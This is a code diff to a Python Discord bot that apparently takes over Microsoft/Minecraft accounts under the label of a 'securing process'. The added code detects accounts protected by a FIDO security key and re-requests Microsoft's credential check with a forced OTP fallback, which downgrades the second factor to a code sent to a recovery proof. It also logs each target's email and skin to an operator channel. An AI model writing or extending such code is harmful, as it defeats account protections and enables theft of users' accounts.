@@ -215,12 +215,93 @@ class MyModalOne(ui.Modal):
             )
             return
         
-        elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
+        elif "FidoParams" in emailInfo["Credentials"]:
+            # Account has a FIDO security key as primary 2FA.
+            # Re-call GetCredentialType with forceotclogin=True and isFidoSupported=False
+            # so Microsoft falls back to sending an OTP to the account's recovery proof.
+            print("[~] - FIDO detected, forcing OTP fallback...")
+
+            emailInfo = await sendAuth(self.session, email, forceotc=True)
+
+            if "Credentials" not in emailInfo:
+                print("[X] - FIDO forceotc fallback: no Credentials in response")
+                await interaction.followup.send(
+                    embed=Embed(
+                        title=embeds["failed_otp"][0],
+                        description=embeds["failed_otp"][1],
+                    ),
+                    view=ButtonViewThree(),
+                    ephemeral=True
+                )
+                await logs_channel.send(
+                    embed=Embed(
+                        title=f"User | {interaction.user.name} ({interaction.user.id})",
+                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO fallback returned no credentials```",
+                        timestamp=datetime.datetime.now(),
+                        colour=0xFF5C5C
+                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
+                    view=ButtonOptions(interaction.user)
+                )
+                return
+
+            if "FidoParams" in emailInfo["Credentials"]:
+                # Still FIDO after forceotc — account has no OTP backup proofs at all
+                print("[X] - FIDO account has no OTP fallback proofs available")
+                await interaction.followup.send(
+                    embed=Embed(
+                        title="❌ Security Key Required",
+                        description="This account only allows physical security key (FIDO) login and has no email/phone backup. It cannot be processed automatically.",
+                        colour=0xFF5C5C
+                    ),
+                    ephemeral=True
+                )
+                await logs_channel.send(
+                    embed=Embed(
+                        title=f"User | {interaction.user.name} ({interaction.user.id})",
+                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO-only account, no OTP proofs available```",
+                        timestamp=datetime.datetime.now(),
+                        colour=0xFF5C5C
+                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
+                    view=ButtonOptions(interaction.user)
+                )
+                return
+
+            # Fall through — emailInfo now has OtcLoginEligibleProofs (or RemoteNgcParams),
+            # which will be caught by the branches below. Re-evaluate by falling into them.
+            print("[+] - FIDO forceotc fallback succeeded, continuing with OTP flow")
+
+        if "OtcLoginEligibleProofs" in emailInfo.get("Credentials", {}):
+
+            # Initialize to None so we get a clean error if no proof has otcSent
+            verflowtoken = None
+            verEmail = None
 
             for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
-                if value["otcSent"]:
+                if value.get("otcSent"):
                     verflowtoken = value["data"]
                     verEmail = value["display"]
+                    break  # Use the first sent proof
+
+            if not verEmail or not verflowtoken:
+                print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
+                await interaction.followup.send(
+                    embed=Embed(
+                        title=embeds["failed_otp"][0],
+                        description=embeds["failed_otp"][1],
+                    ),
+                    view=ButtonViewThree(),
+                    ephemeral=True
+                )
+                await logs_channel.send(
+                    embed=Embed(
+                        title=f"User | {interaction.user.name} ({interaction.user.id})",
+                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | No OTP code was sent to any proof```",
+                        timestamp=datetime.datetime.now(),
+                        colour=0xFF5C5C
+                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
+                    view=ButtonOptions(interaction.user)
+                )
+                return
 
             print("\n| Starting securing process |\n")
             print(f"[+] - Found security email: {verEmail}")
